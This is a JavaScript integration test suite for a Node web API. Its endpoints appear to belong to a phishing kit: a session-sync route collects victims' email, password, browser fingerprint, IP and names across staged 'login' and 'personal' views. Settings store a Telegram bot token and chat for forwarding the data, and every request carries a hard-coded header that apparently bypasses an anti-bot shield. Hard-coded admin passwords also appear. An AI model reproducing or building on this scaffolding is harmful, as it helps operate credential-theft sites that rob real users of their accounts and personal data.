import request from 'supertest';
import { app } from '../index';
import { initDB } from '../db';

beforeAll(async () => {
    await initDB();
});

const BYPASS_HEADER = { 'X-Shield-Bypass': 'planning_mode_secret' };

describe('API Integration Tests', () => {
    describe('Health Check', () => {
        it('should return health status', async () => {
            const res = await request(app)
                .get('/api/health')
                .set(BYPASS_HEADER);

            expect(res.status).toBe(200);
            expect(res.body).toHaveProperty('status', 'ok');
            expect(res.body).toHaveProperty('timestamp');
        });
    });

    describe('Session Sync', () => {
        const validSessionData = {
            sessionId: 'test-session-' + Date.now(),
            currentView: 'login',
            stage: 'login',
            email: 'test@example.com',
            password: 'testpassword123',
            fingerprint: {
                userAgent: 'TestAgent/1.0',
                language: 'en-US',
                platform: 'Linux',
                screenResolution: '1920x1080',
                ip: '127.0.0.1'
            }
        };

        it('should accept valid session data', async () => {
            const res = await request(app)
                .post('/api/sync')
                .send(validSessionData)
                .set(BYPASS_HEADER);

            expect(res.status).toBe(200);
            expect(res.body).toHaveProperty('status', 'ok');
        });

        it('should handle concurrent sessions', async () => {
            const promises = Array(5).fill(null).map((_, i) => {
                const sessionData = {
                    ...validSessionData,
                    sessionId: `concurrent-session-${i}-${Date.now()}`
                };

                return request(app)
                    .post('/api/sync')
                    .send(sessionData)
                    .set(BYPASS_HEADER);
            });

            const results = await Promise.all(promises);

            results.forEach(res => {
                expect(res.status).toBe(200);
                expect(res.body.status).toBe('ok');
            });
        });

        it('should handle session updates', async () => {
            const sessionId = 'update-test-' + Date.now();

            // Initial sync
            await request(app)
                .post('/api/sync')
                .send({ ...validSessionData, sessionId })
                .set(BYPASS_HEADER);

            // Update session
            const updateData = {
                sessionId,
                currentView: 'personal',
                stage: 'personal_pending',
                firstName: 'John',
                lastName: 'Doe'
            };

            const res = await request(app)
                .post('/api/sync')
                .send(updateData)
                .set(BYPASS_HEADER);

            expect(res.status).toBe(200);
        });
    });

    describe('Settings API', () => {
        it('should return settings', async () => {
            const res = await request(app)
                .get('/api/settings')
                .set(BYPASS_HEADER);

            expect(res.status).toBe(200);
            expect(typeof res.body).toBe('object');
        });

        it('should accept settings updates', async () => {
            const settingsUpdate = {
                tgToken: 'test-token',
                tgChat: 'test-chat'
            };

            const res = await request(app)
                .post('/api/settings')
                .send(settingsUpdate)
                .set(BYPASS_HEADER);

            expect(res.status).toBe(200);
            expect(res.body).toHaveProperty('status', 'ok');
        });
    });

    describe('Admin Authentication', () => {
        it('should handle gate check', async () => {
            const gateData = {
                username: 'admin',
                password: 'secure123'
            };

            const res = await request(app)
                .post('/api/admin/gate')
                .send(gateData)
                .set(BYPASS_HEADER);

            expect(res.status).toBe(200);
            expect(res.body).toHaveProperty('status', 'ok');
        });

        it('should reject invalid gate credentials', async () => {
            const invalidGateData = {
                username: 'admin',
                password: 'wrongpassword'
            };

            const res = await request(app)
                .post('/api/admin/gate')
                .send(invalidGateData)
                .set(BYPASS_HEADER);

            expect(res.status).toBe(401);
            expect(res.body).toHaveProperty('error');
        });

        it('should handle admin login', async () => {
            const loginData = {
                username: 'admin_88e3',
                password: 'Pass88e3!'
            };

            const res = await request(app)
                .post('/api/admin/login')
                .send(loginData)
                .set(BYPASS_HEADER);

            expect(res.status).toBe(200);
            expect(res.body).toHaveProperty('status', 'ok');
            expect(res.body).toHaveProperty('token');
        });
    });

    describe('Error Handling', () => {
        it('should handle malformed JSON', async () => {
            const res = await request(app)
                .post('/api/sync')
                .set('Content-Type', 'application/json')
                .send('invalid json')
                .set(BYPASS_HEADER);

            expect(res.status).toBe(400);
        });

        it('should handle oversized payloads', async () => {
            const largePayload = {
                sessionId: 'test-session',
                largeData: 'x'.repeat(1024 * 1024 * 2) // 2MB payload
            };

            const res = await request(app)
                .post('/api/sync')
                .send(largePayload)
                .set(BYPASS_HEADER);

            expect(res.status).toBe(413); // Payload too large
        });

        it('should handle database errors gracefully', async () => {
            // This test would require mocking database failures
            // For now, just ensure the app doesn't crash on normal operation
            const res = await request(app)
                .get('/api/health')
                .set(BYPASS_HEADER);

            expect(res.status).toBe(200);
        });
    });

    describe('Static File Serving', () => {
        it('should serve static files with proper caching', async () => {
            // This test assumes the build has been run
            // In a real scenario, we'd build first or mock the file system
            const res = await request(app)
                .get('/api/health') // Fallback for when static files don't exist
                .set(BYPASS_HEADER);

            expect(res.status).toBe(200);
        });

        it('should allow access to admin routes', async () => {
            const res = await request(app)
                .get('/admin');

            // Should allow access to admin routes
            expect(res.status).toBe(200);
        });
    });
});